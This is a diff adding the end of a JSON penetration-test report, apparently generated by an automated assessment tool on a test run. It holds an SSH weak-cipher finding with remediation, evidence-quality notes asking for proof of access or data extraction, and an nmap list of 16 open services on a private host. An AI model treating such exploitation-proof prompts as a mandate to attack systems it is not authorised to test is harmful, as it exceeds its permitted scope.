+      "remediation": "Upgrade OpenSSH to a current supported version. Disable weak ciphers (arcfour, DES, RC4) and weak KEX algorithms (diffie-hellman-group1-sha1) in sshd_config. Use only AES-GCM or ChaCha20-Poly1305 ciphers. Use curve25519-sha256 or diffie-hellman-group16-sha512 for key exchange.",
+      "references": [
+        "CWE-327"
+      ],
+      "exploitable": false,
+      "exploitation_status": "NEEDS_VERIFICATION",
+      "discovered_at": "2026-03-01T18:22:41.365045",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "weak",
+        "score": 10,
+        "issues": [
+          "No proof of exploitation found"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction",
+          "Show successful connection or authentication",
+          "Include session output or file access proof"
+        ],
+        "has_exploitation_proof": false
+      },
+      "id": "FINDING-014",
+      "evidence_quality": {
+        "level": "weak",
+        "score": 10,
+        "issues": [
+          "No proof of exploitation found"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction",
+          "Show successful connection or authentication",
+          "Include session output or file access proof"
+        ]
+      }
+    }
+  ],
+  "hosts": [
+    {
+      "ip": "192.168.0.140",
+      "ports": [
+        21,
+        22,
+        23,
+        25,
+        53,
+        80,
+        111,
+        139,
+        445,
+        512,
+        513,
+        514,
+        2049,
+        3306,
+        5432,
+        5900
+      ]
+    }
+  ],
+  "services": [
+    {
+      "service": "192.168.0.140:21/ftp"
+    },
+    {
+      "service": "192.168.0.140:22/ssh"
+    },
+    {
+      "service": "192.168.0.140:23/telnet"
+    },
+    {
+      "service": "192.168.0.140:25/smtp"
+    },
+    {
+      "service": "192.168.0.140:53/domain"
+    },
+    {
+      "service": "192.168.0.140:80/http"
+    },
+    {
+      "service": "192.168.0.140:111/rpcbind"
+    },
+    {
+      "service": "192.168.0.140:139/netbios-ssn"
+    },
+    {
+      "service": "192.168.0.140:445/netbios-ssn"
+    },
+    {
+      "service": "192.168.0.140:512/exec"
+    },
+    {
+      "service": "192.168.0.140:513/login"
+    },
+    {
+      "service": "192.168.0.140:514/tcpwrapped"
+    },
+    {
+      "service": "192.168.0.140:2049/nfs"
+    },
+    {
+      "service": "192.168.0.140:3306/mysql"
+    },
+    {
+      "service": "192.168.0.140:5432/postgresql"
+    },
+    {
+      "service": "192.168.0.140:5900/vnc"
+    }
+  ],
+  "tools_used": [
+    "nmap"
+  ],
+  "methodology": {
+    "standard": "PTES",
+    "phases_completed": []
+  },
+  "token_usage": {
+    "total_input_tokens": 29,
+    "total_output_tokens": 16919,
+    "total_cache_read_tokens": 1139612,
+    "total_cache_creation_tokens": 52652,
+    "total_cost_usd": 1.3220009999999998,
+    "total_api_duration_ms": 291609.0,
+    "total_turns": 66
+  },
+  "metadata": {
+    "generator": "NTREE Complete Assessment",
+    "generated_at": "2026-03-01T18:23:10.434263"
+  },
+  "executive_summary": "A penetration test was conducted against the target environment, discovering 1 hosts with 16 services. The overall security posture is assessed as **Critical** with a risk score of 78.9/100. **5 CRITICAL** vulnerabilities were identified requiring immediate attention. 5 high-severity issues were found that should be addressed in the near term. A total of 14 actionable findings require remediation. Note: 8 findings have evidence that may need additional validation."
+}
